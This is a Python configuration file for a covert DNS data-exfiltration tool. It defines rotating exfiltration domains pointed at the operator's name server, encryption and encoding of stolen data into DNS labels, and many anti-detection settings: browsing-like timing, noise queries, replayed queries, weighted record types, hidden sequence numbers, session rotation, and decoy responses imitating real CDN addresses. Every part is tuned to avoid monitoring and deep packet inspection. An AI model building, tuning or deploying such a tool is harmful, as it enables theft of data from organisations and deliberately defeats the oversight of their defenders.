"""Configuration for stealth DNS exfiltration tool."""

import os

# --- Domain Configuration ---
# Multiple domains for rotation (register several aged domains)
# NS records for each must point to your server
BASE_DOMAINS = [
    "analytics-cdn.example.com",
    "cdn-metrics.example.com",
    "static-assets.example.com",
]
# Active domain index (rotated automatically during transfer)
BASE_DOMAIN = BASE_DOMAINS[0]  # default, overridden at runtime

# --- Encryption ---
# AES-CTR encryption before encoding eliminates gzip signatures
# and produces uniform random bytes (no structural patterns for DPI)
ENCRYPT_DATA = True

# --- Encoding Strategy ---
# "hex_split" = lower entropy hex labels with CDN-like prefixes
# "wordlist"  = each byte mapped to an English word (lowest entropy)
ENCODING_STRATEGY = "hex_split"
HEX_LABEL_LENGTH_MIN = 6       # minimum chars per label (variable length)
HEX_LABEL_LENGTH_MAX = 12      # maximum chars per label (variable length)
HEX_LABEL_LENGTH = 8           # fallback/average for chunk size calculation
LABELS_PER_QUERY = 3            # data labels per DNS query

# --- Compression ---
COMPRESS_DATA = True            # gzip before encoding (60-80% reduction)

# --- Integrity ---
HASH_ALGORITHM = "sha256"

# --- Anti-Detection: Timing (realistic browsing model) ---
# Uses log-normal distribution instead of exponential for more realistic timing
BURST_SIZE_MIN = 3
BURST_SIZE_MAX = 12
INTRA_BURST_DELAY = (0.005, 0.08)    # seconds between queries in a burst
INTER_BURST_DELAY_MEAN = 8.0         # mean seconds between bursts
INTER_BURST_DELAY_MIN = 1.0          # minimum gap
INTER_BURST_DELAY_MAX = 45.0         # maximum gap
# Log-normal parameters (mu, sigma) — produces a right-skewed distribution
# matching real browsing: many short pauses, occasional long ones
INTER_BURST_DELAY_SIGMA = 0.8        # spread of log-normal distribution

# --- Anti-Detection: Noise ---
NOISE_RATIO = 4                  # noise queries per data query
NOISE_DOMAINS_FILE = os.path.join(os.path.dirname(__file__), "noise_domains.txt")
DUPLICATE_QUERY_RATE = 0.45      # probability of re-sending a previous query (raised from 0.20)
CACHE_HIT_DOMAINS = 30           # number of "frequently visited" domains (raised from 15)
CACHE_REPEAT_RATE = 0.15         # probability of repeating a cached noise domain
# Subdomain recycling: reuse data query names across bursts
SUBDOMAIN_RECYCLE_RATE = 0.10    # probability of replaying a data qname as noise

# --- Anti-Detection: Record Types ---
# Weighted distribution matching normal browsing patterns
QUERY_TYPE_WEIGHTS = {"A": 70, "AAAA": 25, "CNAME": 5}

# --- Anti-Detection: Sequence Obfuscation ---
# Sequence number is embedded inside encoded data, not as a separate label
SEQUENCE_BYTES = 2               # 2 bytes = supports up to 65535 chunks
SESSION_KEY_LENGTH = 4           # bytes, used to XOR sequence numbers

# --- Anti-Detection: Session Rotation ---
# Session ID rotates every N bursts (with jitter) to prevent correlation
SESSION_ROTATE_MIN = 6           # minimum bursts before rotation
SESSION_ROTATE_MAX = 14          # maximum bursts before rotation
SESSION_ROTATE_INTERVAL = 8     # kept for backwards compat (unused in new logic)
SESSION_ID_LENGTH = 4            # hex chars for session identifier

# --- Server (dns_server.py) ---
DNS_PORT = 53
RESPONSE_IP_POOL = {
    "A": [
        "104.16.132.229", "104.16.133.229",   # Cloudflare
        "172.67.134.180", "172.67.135.180",
        "104.21.45.67", "104.21.45.68",
        "13.107.42.14", "13.107.21.200",      # Microsoft/LinkedIn
        "151.101.1.69", "151.101.65.69",      # Fastly/Reddit
    ],
    "AAAA": [
        "2606:4700::6810:84e5", "2606:4700::6810:85e5",
        "2a06:98c1:3120::7", "2a06:98c1:3121::7",
    ],
    "CNAME": [
        "cdn.example-cdn.net.", "edge.example-cdn.net.",
        "lb.example-cdn.net.",
    ],
}
RESPONSE_TTL_RANGE = (60, 3600)    # realistic CDN TTL range (raised minimum)
OUTPUT_DIR = "./received/"

# --- Protocol ---
METADATA_PREFIX = "m"           # first label prefix for metadata queries
MAX_RETRIES = 5
